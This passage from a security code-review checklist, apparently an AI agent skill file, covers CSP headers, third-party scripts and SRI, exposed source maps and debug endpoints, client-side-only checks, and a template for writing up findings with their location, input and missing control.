Content-Security-Policy: default-src 'self'; script-src 'nonce-<random per response>' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

No CSP at all is a Medium by itself at most: CSP is a second line. It
becomes the difference between Low and High for every XSS found elsewhere.
A CSP in `Content-Security-Policy-Report-Only` protects nothing.

## 25. Third-party scripts and SRI (CWE-829, CWE-353)

**Leads**: `<skill>/scripts/leads.sh "<script[^>]+src=[\"']https?:|<link[^>]+href=[\"']https?:|loadScript|appendChild\(script"` in HTML, templates and JS.

```html
<!-- BAD: whoever controls the CDN path controls the page -->
<script src="https://cdn.example.test/lib/latest/widget.js"></script>

<!-- GOOD: fixed version, integrity hash, no credentials sent -->
<script src="https://cdn.example.test/lib/4.2.1/widget.min.js"
        integrity="sha384-(base64 hash of that exact file)" crossorigin="anonymous"></script>
```

List every third-party origin that executes script: analytics, tag
managers, chat widgets, A/B testing, payment. For each: is it needed on
pages that show sensitive data (login, payment, admin)? A tag manager is
remote code execution granted to whoever has access to its console. SRI
cannot be used on scripts that change without notice; then the control is
the CSP and keeping them off sensitive pages.

## 26. Source maps and debug artefacts in production (CWE-540)

**Leads**: `<skill>/scripts/leads.sh "sourcemap|sourceMap|devtool|productionBrowserSourceMaps|GENERATE_SOURCEMAP"` in build configs. Check `dist/` or `build/` for `*.map` only if built assets are committed or handed over by the owner: do not run the build (`SKILL.md`, rule 1).

Public source maps are not a vulnerability in themselves: front-end code is
public anyway. They become a finding when the source holds what should not
ship: internal URLs, commented-out credentials, admin routes, feature flags.
The usual fix is to upload maps to the error tracker and not serve them.
Same check for `.env` files copied into the image, `/.git/` served by the
web server, and debug endpoints (`/actuator`, `/__debug__`, `/graphql`
introspection and playground enabled in production).

## 27. Client-side trust

A check done only in the browser (disabled button, hidden menu, client-side
price or validation) is UX, not a control: find its server-side twin.
Made-up example: the SPA hides "Delete user" for non-admins, and
`DELETE /api/users/:id` only requires a valid session: CWE-862.

---

# After the checklist

For each confirmed finding write the lines that make it falsifiable. Which
lines depends on the kind of finding:

```
Data flow                                   Missing control
Where:   src/routes/invoices.ts:42          Where:   src/routes/auth.ts:18, POST /login
Input:   req.params.id (any logged-in user) Who:     anyone, no account needed
Sink:    db.invoice.findUnique, returned    Expected: a limit per account and per IP
Missing: a tenant condition on the query    Absent:  no limiter in the route, the router or app.ts
```

A configuration or cryptography finding (a cookie flag, MD5 for passwords)
uses the right-hand shape: where it is set, who benefits, what was expected,
what is there instead. For "Absent", say where you looked: a control you
did not find in the handler may live in a middleware or a gateway. If you
cannot fill every line, it is an observation, not a finding.
